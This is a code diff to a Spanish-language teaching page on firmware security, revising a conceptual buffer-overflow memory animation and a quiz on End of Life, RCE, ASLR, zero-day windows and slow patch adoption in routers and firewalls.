-    'Estado inicial. Toda la memoria del stack está vacía. El programa no ha recibido datos todavía.',
-    'Estado normal: el buffer (celdas 0-7, 8 bytes) contiene datos legítimos del usuario — por ejemplo, un nombre de usuario corto. Las celdas 8-27 son otras variables del stack de la función. Las celdas 28-31 contienen la dirección de retorno — la dirección a la que vuelve el programa cuando termina la función. Todo está en orden.',
-    '⚠ Overflow: el atacante envió 200 bytes a un buffer que solo soporta 8. Las primeras 8 celdas (0-7) contienen el principio de los datos. Los bytes extras se desbordaron hacia las celdas 8-23, sobrescribiendo otras variables del stack con datos maliciosos. El programa sigue corriendo — todavía no ha retornado de la función.',
-    '⚠ CRÍTICO: el overflow llegó hasta las celdas 28-31, que contenían la dirección de retorno legítima. Ahora esa dirección apunta a una ubicación controlada por el atacante — donde puso su shellcode. Cuando la función retorne, el procesador seguirá esa dirección nueva en lugar de la original.',
-    '☠ Shellcode ejecutado. La función retornó y siguió la dirección manipulada. El procesador saltó al shellcode del atacante (celdas 24-31). El shellcode corre con los privilegios del proceso del firmware — root. El atacante ahora tiene control total del dispositivo.'
+    'Estado inicial. Toda la memoria del stack está vacía.',
+    'Estado normal: el buffer (celdas 0-7) contiene datos legítimos. Las celdas 28-31 contienen la dirección de retorno — la dirección a la que vuelve el programa cuando termina la función. Todo está en orden.',
+    '⚠ Overflow: el atacante envió 200 bytes a un buffer que solo soporta 8. Los bytes extras se desbordaron hacia las celdas 8-23, sobrescribiendo otras variables del stack con datos maliciosos.',
+    '⚠ CRÍTICO: el overflow llegó hasta las celdas 28-31, sobrescribiendo la dirección de retorno. Ahora apunta a una ubicación controlada por el atacante donde puso su shellcode.',
+    '☠ Shellcode ejecutado. La función retornó y el procesador saltó al shellcode (celdas 24-31). Corre con los privilegios del firmware — root. El atacante tiene control total del dispositivo.'
   ];
   const steps = [
     [],
     [[0,7,'d','D'],[28,31,'ret','RET']],
-    [[0,7,'d','D'],[8,23,'ov','!!'] ,[28,31,'ret','RET']],
-    [[0,7,'d','D'],[8,23,'ov','!!'] ,[28,31,'ret','→SH']],
-    [[0,7,'d','D'],[8,23,'ov','!!'] ,[28,31,'ret','→SH'],[24,31,'sh','SH']],
+    [[0,7,'d','D'],[8,23,'ov','!!'],[28,31,'ret','RET']],
+    [[0,7,'d','D'],[8,23,'ov','!!'],[28,31,'ret','→SH']],
+    [[0,7,'d','D'],[8,23,'ov','!!'],[28,31,'ret','→SH'],[24,31,'sh','SH']]
   ];
   setRanges(steps[n]);
   const m = document.getElementById('memMsg');
   if (m) m.textContent = msgs[n];
 }
-buildGrid();
 mStep(0);
 
-/* QUIZ */
+// QUIZ
 const questions = [
   {
-    q: '¿Cuál es la diferencia más importante entre el firmware de un router empresarial y el sistema operativo de una PC?',
+    q: '¿Cuál es la diferencia principal entre el firmware de un router y el sistema operativo de tu computadora personal?',
     opts: [
-      { t: 'El firmware es más potente y tiene más funciones. Por eso es más difícil actualizarlo.', correct: false, exp: 'Incorrecto. El firmware es más limitado, no más potente. Su diseño es minimalista y específico para el hardware.' },
-      { t: 'El firmware está embebido en un chip, es de código cerrado, y puede pasar años sin actualizarse — a diferencia de los SO de PC que tienen parches automáticos frecuentes.', correct: true, exp: '✓ Correcto. Esas son exactamente las tres diferencias críticas: código embebido en hardware, propietario (sin auditoría externa posible), y ciclo de actualización extremadamente lento.' },
-      { t: 'No hay diferencia real. Ambos reciben actualizaciones automáticas similares con la misma frecuencia.', correct: false, exp: 'Incorrecto. Esta es precisamente la diferencia más importante: el firmware de routers puede pasar años sin actualizarse, mientras que un PC moderno recibe parches semanales.' },
-      { t: 'El firmware usa siempre Linux, por lo que hereda todas sus protecciones de seguridad automáticamente.', correct: false, exp: 'Aunque algunos routers usan Linux como base, el firmware propietario encima tiene código cerrado sin las protecciones compiladas que tendría un Linux estándar (ASLR, DEP, stack canaries).' },
+      {t:'El firmware es más potente y tiene más características que un SO de escritorio.', correct:false, exp:'Incorrecto. El firmware es más simple y limitado. Su fortaleza es ser ligero y eficiente para el hardware específico, no ser más potente.'},
+      {t:'El firmware está grabado directamente en el hardware, es código cerrado, raramente recibe actualizaciones, y cuando el dispositivo llega a EoL, las vulnerabilidades no tienen corrección jamás. Un SO de escritorio tiene actualizaciones frecuentes, automáticas y a largo plazo.', correct:true, exp:'✓ Correcto. Esas son exactamente las cuatro diferencias críticas: permanencia en hardware, código cerrado, ciclo de actualización lento, y el problema terminal del EoL.'},
+      {t:'La única diferencia es que el firmware no tiene interfaz gráfica, pero tiene las mismas actualizaciones de seguridad.', correct:false, exp:'Incorrecto. La falta de interfaz gráfica es irrelevante para la seguridad. Las diferencias críticas son el código cerrado, la frecuencia de actualizaciones, y la problemática del EoL.'},
+      {t:'Son fundamentalmente lo mismo — ambos son software que controla hardware.', correct:false, exp:'Aunque ambos son software, sus modelos de actualización, apertura del código, y ciclo de vida de seguridad son radicalmente diferentes — eso es lo que crea el riesgo.'}
     ]
   },
   {
-    q: '¿Qué significa RCE y por qué es tan crítico en el contexto de dispositivos perimetrales?',
+    q: '¿Qué significa exactamente que un dispositivo llegue a "End of Life" (EoL) desde el punto de vista de seguridad?',
     opts: [
-      { t: 'Remote Control Environment — una herramienta de administración remota legítima para gestionar redes.', correct: false, exp: 'No. RCE no es una herramienta — es una clase de vulnerabilidad. No tiene nada de legítimo.' },
-      { t: 'Remote Code Execution — el atacante puede ejecutar código arbitrario en el dispositivo por red sin acceso físico. En un firewall, esto significa control total de la red protegida.', correct: true, exp: '✓ Correcto. RCE en un dispositivo perimetral es especialmente devastador porque ese dispositivo tiene acceso y visibilidad de todo el tráfico de la red — comprometer el firewall equivale a comprometer toda la red.' },
-      { t: 'Read-Copy-Execute — una técnica de optimización de memoria para mejorar el rendimiento del firmware.', correct: false, exp: 'Eso no existe en este contexto. RCE siempre se refiere a Remote Code Execution en seguridad.' },
-      { t: 'Recursive Cache Exploitation — un ataque a la memoria caché del procesador del router.', correct: false, exp: 'Incorrecto. RCE es Remote Code Execution — ejecución remota de código arbitrario.' },
+      {t:'El dispositivo deja de funcionar automáticamente y hay que reemplazarlo.', correct:false, exp:'No. El dispositivo sigue funcionando perfectamente — el problema es invisible. EoL solo significa que el fabricante dejó de dar soporte, no que el hardware se apague.'},
+      {t:'El dispositivo entra en modo de bajo consumo para extender su vida útil.', correct:false, exp:'EoL es un estado comercial/de soporte, no un estado de funcionamiento del hardware.'},
+      {t:'El fabricante deja de publicar parches de seguridad para ese modelo. Cualquier vulnerabilidad descubierta después nunca tendrá corrección — la única solución es reemplazar el hardware.', correct:true, exp:'✓ Correcto. Esa es la consecuencia crítica del EoL: vulnerabilidades permanentes sin solución posible mientras el dispositivo siga en uso. Y en muchas redes empresariales, esos dispositivos permanecen en producción durante años.'},
+      {t:'El dispositivo puede seguir recibiendo parches de la comunidad open source, igual que Linux.', correct:false, exp:'El firmware de dispositivos de red es código propietario y cerrado. No existe una comunidad que pueda publicar parches alternativos como ocurre con software open source.'}
     ]
   },
   {
-    q: 'En un ataque de Buffer Overflow exitoso contra firmware, ¿cuál es el elemento de memoria más crítico que el atacante necesita sobrescribir?',
+    q: '¿Qué significa RCE y por qué es especialmente grave en un firewall empresarial?',
     opts: [
-      { t: 'La contraseña del administrador almacenada en el buffer — para poder autenticarse.', correct: false, exp: 'No. El objetivo no es leer o modificar datos del buffer sino controlar el flujo de ejecución del programa.' },
-      { t: 'La dirección de retorno del stack — que le dice al procesador a dónde saltar cuando termina una función. Si la sobrescribes, controlas la ejecución.', correct: true, exp: '✓ Correcto. La dirección de retorno es la pieza clave. Sobrescribiéndola con la dirección del shellcode del atacante, el procesador ejecuta el código malicioso cuando la función termina.' },
-      { t: 'El registro de usuario activo del sistema operativo — para escalar privilegios directamente.', correct: false, exp: 'Incorrecto. El ataque opera a nivel de memoria del proceso en el stack. No modifica registros del SO directamente.' },
-      { t: 'El heap del programa — donde se almacenan los objetos dinámicos del sistema.', correct: false, exp: 'El heap existe y puede ser objetivo de otros ataques (heap overflow), pero en el Buffer Overflow clásico el objetivo es el stack y específicamente la dirección de retorno.' },
+      {t:'Remote Code Execution — el atacante puede ejecutar código arbitrario en el dispositivo por red sin acceso físico. En un firewall, esto significa control total de la red protegida.', correct:true, exp:'✓ Correcto. RCE en un dispositivo perimetral es especialmente devastador porque ese dispositivo tiene acceso y visibilidad de todo el tráfico — comprometer el firewall equivale a comprometer toda la red.'},
+      {t:'Read-Copy-Execute — una técnica de optimización de memoria para mejorar el rendimiento del firmware.', correct:false, exp:'Eso no existe en este contexto. RCE siempre se refiere a Remote Code Execution en seguridad.'},
+      {t:'Recursive Cache Exploitation — un ataque a la memoria caché del procesador del router.', correct:false, exp:'Incorrecto. RCE es Remote Code Execution — ejecución remota de código arbitrario.'}
+    ]
+  },
+  {
+    q: 'En un ataque de Buffer Overflow exitoso, ¿cuál es el elemento de memoria más crítico que el atacante necesita sobrescribir?',
+    opts: [
+      {t:'La contraseña del administrador almacenada en el buffer — para poder autenticarse.', correct:false, exp:'No. El objetivo no es leer o modificar datos del buffer sino controlar el flujo de ejecución del programa.'},
+      {t:'La dirección de retorno del stack — que le dice al procesador a dónde saltar cuando termina una función. Si la sobrescribes, controlas la ejecución.', correct:true, exp:'✓ Correcto. La dirección de retorno es la pieza clave. Sobrescribiéndola con la dirección del shellcode, el procesador ejecuta el código malicioso cuando la función termina.'},
+      {t:'El registro de usuario activo del SO — para escalar privilegios directamente.', correct:false, exp:'Incorrecto. El ataque opera a nivel de memoria del proceso en el stack. No modifica registros del SO directamente.'},
+      {t:'El heap del programa — donde se almacenan los objetos dinámicos.', correct:false, exp:'El heap puede ser objetivo de otros ataques (heap overflow), pero en el Buffer Overflow clásico el objetivo es el stack y específicamente la dirección de retorno.'}
     ]
   },
   {
     q: '¿Por qué la ausencia de ASLR hace que los exploits de Buffer Overflow en firmware sean especialmente efectivos?',
     opts: [
-      { t: 'Porque sin ASLR, el firmware no puede detectar si hay datos maliciosos en el buffer.', correct: false, exp: 'ASLR no detecta datos maliciosos — esa es la función de los stack canaries. ASLR aleatoriza posiciones de memoria.' },
-      { t: 'Porque sin ASLR, las direcciones de memoria son siempre las mismas en todos los dispositivos del mismo modelo. El atacante las calcula una vez y el exploit funciona en todos.', correct: true, exp: '✓ Correcto. Sin ASLR, la dirección de retorno y la ubicación del shellcode son completamente predecibles. Un exploit desarrollado para el modelo X versión Y del firmware funciona en todos los dispositivos con ese mismo firmware — los atacantes pueden crear exploits que funcionan a escala masiva.' },
-      { t: 'Porque sin ASLR, el firmware no puede usar memoria RAM y todo se ejecuta en la memoria flash.', correct: false, exp: 'Incorrecto. ASLR no tiene relación con qué tipo de memoria se usa. Es un mecanismo de aleatorización de direcciones de memoria virtual.' },
-      { t: 'Porque sin ASLR, el dispositivo no puede conectarse a internet de forma segura.', correct: false, exp: 'No. ASLR es un mecanismo de protección de memoria del proceso — no tiene relación directa con la conectividad de red.' },
+      {t:'Porque sin ASLR, el firmware no puede detectar si hay datos maliciosos en el buffer.', correct:false, exp:'ASLR no detecta datos maliciosos — esa es la función de los stack canaries. ASLR aleatoriza posiciones de memoria.'},
+      {t:'Porque sin ASLR, las direcciones de memoria son siempre las mismas en todos los dispositivos del mismo modelo. El atacante las calcula una vez y el exploit funciona en todos.', correct:true, exp:'✓ Correcto. Sin ASLR, la dirección de retorno y la ubicación del shellcode son completamente predecibles. Un exploit para el modelo X versión Y funciona en todos los dispositivos con ese firmware — a escala masiva.'},
+      {t:'Porque sin ASLR, el firmware no puede usar memoria RAM y todo se ejecuta en la memoria flash.', correct:false, exp:'Incorrecto. ASLR no tiene relación con qué tipo de memoria se usa. Es un mecanismo de aleatorización de direcciones de memoria virtual.'},
+      {t:'Porque sin ASLR, el dispositivo no puede conectarse a internet de forma segura.', correct:false, exp:'No. ASLR es un mecanismo de protección de memoria del proceso — no tiene relación directa con la conectividad de red.'}
     ]
   },
   {
     q: '¿Qué define exactamente la "Zero-Day Window" y por qué no existe ninguna defensa efectiva durante esta fase?',
     opts: [
-      { t: 'Es el período en que el parche está disponible pero los administradores todavía no lo han aplicado.', correct: false, exp: 'Eso es la Fase 5 del ciclo, no el Zero-Day. En la Zero-Day Window ni siquiera existe parche — el fabricante no sabe que el fallo existe.' },
-      { t: 'Es el tiempo desde que se publica el CVE hasta que el fabricante publica el parche. Es peligrosa porque el exploit es público.', correct: false, exp: 'No. Cuando existe un CVE, el fabricante ya sabe del fallo. El Zero-Day es específicamente cuando el fabricante desconoce que existe el problema.' },
-      { t: 'Es el período entre que un actor malicioso descubre la vulnerabilidad y el fabricante se entera. No hay parche, no hay CVE, no hay firma antivirus — ninguna defensa basada en conocimiento es posible.', correct: true, exp: '✓ Correcto. La Zero-Day Window es devastadora precisamente por esa combinación: sin conocimiento del fabricante no puede haber parche, sin CVE no hay información pública, sin firma no hay detección. Es la ventana de ventaja total para el atacante.' },
-      { t: 'Es el tiempo que tarda el atacante en desarrollar el exploit después de conocer el CVE.', correct: false, exp: 'No. El Zero-Day ocurre antes de que exista cualquier CVE. Es el período de desconocimiento total del fabricante.' },
+      {t:'Es el período en que el parche está disponible pero los administradores todavía no lo han aplicado.', correct:false, exp:'Eso es la Fase 5 del ciclo, no el Zero-Day. En la Zero-Day Window ni siquiera existe parche.'},
+      {t:'Es el tiempo desde que se publica el CVE hasta que el fabricante publica el parche.', correct:false, exp:'No. Cuando existe un CVE, el fabricante ya sabe del fallo. El Zero-Day es específicamente cuando el fabricante desconoce que existe el problema.'},
+      {t:'Es el período entre que un actor malicioso descubre la vulnerabilidad y el fabricante se entera. No hay parche, no hay CVE, no hay firma antivirus — ninguna defensa basada en conocimiento es posible.', correct:true, exp:'✓ Correcto. La Zero-Day Window es devastadora por esa combinación: sin conocimiento del fabricante no puede haber parche, sin CVE no hay información pública, sin firma no hay detección.'},
+      {t:'Es el tiempo que tarda el atacante en desarrollar el exploit después de conocer el CVE.', correct:false, exp:'No. El Zero-Day ocurre antes de que exista cualquier CVE. Es el período de desconocimiento total del fabricante.'}
     ]
   },
   {
     q: 'El fabricante publica un parche crítico para un firewall empresarial. ¿Por qué el riesgo persiste durante meses o años?',
     opts: [
-      { t: 'Los parches de firmware se aplican automáticamente en todos los dispositivos al publicarse, igual que en Windows. El riesgo desaparece inmediatamente.', correct: false, exp: 'Incorrecto. El firmware de dispositivos enterprise NO se actualiza automáticamente. Requiere intervención manual planificada. Esta confusión es exactamente la que causa que el 77% quede sin parchear.' },
-      { t: 'Porque los administradores temen dejar el dispositivo inoperable, el proceso es complejo y requiere planificación, y algunos equipos están en EoL sin parche disponible — solo el 23% aplica el parche en 90 días.', correct: true, exp: '✓ Correcto. La combinación de miedo técnico, complejidad operativa, y dispositivos sin soporte resulta en una adopción extremadamente baja y lenta. El 77% de firewalls y routers permanece vulnerable durante meses o años.' },
-      { t: 'Porque los parches de firmware solo mejoran el rendimiento, no corrigen fallos de seguridad.', correct: false, exp: 'Incorrecto. Las actualizaciones de firmware con frecuencia incluyen correcciones de seguridad críticas. De hecho, ese es su propósito principal en el contexto que estamos estudiando.' },
-      { t: 'Porque el parche requiere reemplazar físicamente el chip de firmware en el hardware, lo cual es demasiado costoso.', correct: false, exp: 'No. Los parches de firmware se actualizan por software, no físicamente. Se descargan del sitio del fabricante y se instalan a través de la interfaz de administración.' },
+      {t:'Los parches de firmware se aplican automáticamente en todos los dispositivos al publicarse. El riesgo desaparece inmediatamente.', correct:false, exp:'Incorrecto. El firmware de dispositivos enterprise NO se actualiza automáticamente. Requiere intervención manual planificada.'},
+      {t:'Porque los administradores temen dejar el dispositivo inoperable, el proceso es complejo y requiere planificación, y algunos equipos están en EoL sin parche disponible — solo el 23% aplica el parche en 90 días.', correct:true, exp:'✓ Correcto. La combinación de miedo técnico, complejidad operativa, y dispositivos sin soporte resulta en una adopción extremadamente baja. El 77% de firewalls y routers permanece vulnerable durante meses o años.'},
+      {t:'Porque los parches de firmware solo mejoran el rendimiento, no corrigen fallos de seguridad.', correct:false, exp:'Incorrecto. Las actualizaciones de firmware frecuentemente incluyen correcciones de seguridad críticas.'},
+      {t:'Porque el parche requiere reemplazar físicamente el chip de firmware.', correct:false, exp:'No. Los parches de firmware se actualizan por software, no físicamente. Se descargan del sitio del fabricante y se instalan a través de la interfaz de administración.'}
     ]
   },
   {
     q: '¿Cuál es la diferencia conceptual correcta entre RCE y Buffer Overflow?',
     opts: [
-      { t: 'Son exactamente lo mismo — son dos nombres para el mismo tipo de ataque.', correct: false, exp: 'No son lo mismo. Están relacionados pero son categorías distintas: uno describe un impacto, el otro una técnica.' },
-      { t: 'RCE es un tipo de Buffer Overflow — específicamente uno que ocurre de forma remota.', correct: false, exp: 'Incorrecto en la dirección. Es al revés: el Buffer Overflow puede ser una técnica que lleva a RCE. RCE es el impacto, BOF es la técnica.' },
-      { t: 'RCE describe el impacto o resultado (ejecutar código remotamente) y puede lograrse con múltiples técnicas. Buffer Overflow es una técnica específica que puede llevar a RCE (entre otros impactos).', correct: true, exp: '✓ Correcto. RCE = qué logró el atacante (el impacto). Buffer Overflow = cómo lo hizo (la técnica). Un BOF puede causar RCE, pero también puede causar solo un crash (DoS). Y RCE puede lograrse sin BOF.' },
-      { t: 'Buffer Overflow es el nombre moderno de lo que antes se llamaba RCE — son el mismo concepto con nombres distintos de diferentes épocas.', correct: false, exp: 'Incorrecto. No son el mismo concepto renombrado. Son categorías distintas — una de impacto y otra de técnica — y ambos términos se usan en paralelo hoy en día.' },
+      {t:'Son exactamente lo mismo — son dos nombres para el mismo tipo de ataque.', correct:false, exp:'No son lo mismo. Están relacionados pero son categorías distintas: uno describe un impacto, el otro una técnica.'},
+      {t:'RCE es un tipo de Buffer Overflow — específicamente uno que ocurre de forma remota.', correct:false, exp:'Incorrecto en la dirección. Es al revés: el Buffer Overflow puede ser una técnica que lleva a RCE. RCE es el impacto, BOF es la técnica.'},
+      {t:'RCE describe el impacto o resultado (ejecutar código remotamente) y puede lograrse con múltiples técnicas. Buffer Overflow es una técnica específica que puede llevar a RCE (entre otros impactos).', correct:true, exp:'✓ Correcto. RCE = qué logró el atacante (el impacto). Buffer Overflow = cómo lo hizo (la técnica). Un BOF puede causar RCE, pero también puede causar solo un crash (DoS). Y RCE puede lograrse sin BOF.'},
+      {t:'Buffer Overflow es el nombre moderno de lo que antes se llamaba RCE.', correct:false, exp:'Incorrecto. No son el mismo concepto renombrado. Son categorías distintas — una de impacto y otra de técnica — y ambos términos se usan en paralelo hoy en día.'}
     ]
-  },
+  }
 ];
 
 const qc = document.getElementById('quizContainer');
@@ -1250,26 +998,23 @@ function checkQ(qi, oi) {
   const chosen = q.opts[oi];
   if (chosen.correct) {
     opts[oi].classList.add('correct');
-    fb.innerHTML = `<span style="color:var(--green)">${chosen.exp}</span>`;
+    fb.style.cssText = 'display:block;background:var(--gb);border:1px solid var(--gbr);color:#88ddaa';
   } else {
     opts[oi].classList.add('wrong');
-    fb.innerHTML = `<span style="color:var(--red)">${chosen.exp}</span>`;
-    q.opts.forEach((o, i) => {
-      if (o.correct) opts[i].classList.add('correct');
-    });
+    fb.style.cssText = 'display:block;background:var(--rb);border:1px solid var(--rbr);color:#dd9988';
+    q.opts.forEach((o, i) => { if (o.correct) opts[i].classList.add('correct'); });
   }
-  fb.style.display = 'block';
+  fb.textContent = chosen.exp;
   document.getElementById(`qr${qi}`).style.display = 'inline-block';
 }
 
 function resetQ(qi) {
   const opts = document.querySelectorAll(`[data-qi="${qi}"]`);
-  opts.forEach(o => {
-    o.style.pointerEvents = '';
-    o.classList.remove('correct', 'wrong');
-  });
+  opts.forEach(o => { o.style.pointerEvents = ''; o.classList.remove('correct','wrong'); });
   const fb = document.getElementById(`qf${qi}`);
-  fb.style.display = 'none';
-  fb.innerHTML = '';
+  fb.style.display = 'none'; fb.textContent = '';
   document.getElementById(`qr${qi}`).style.display = 'none';
 }
+</script>
+</body>
+</html>
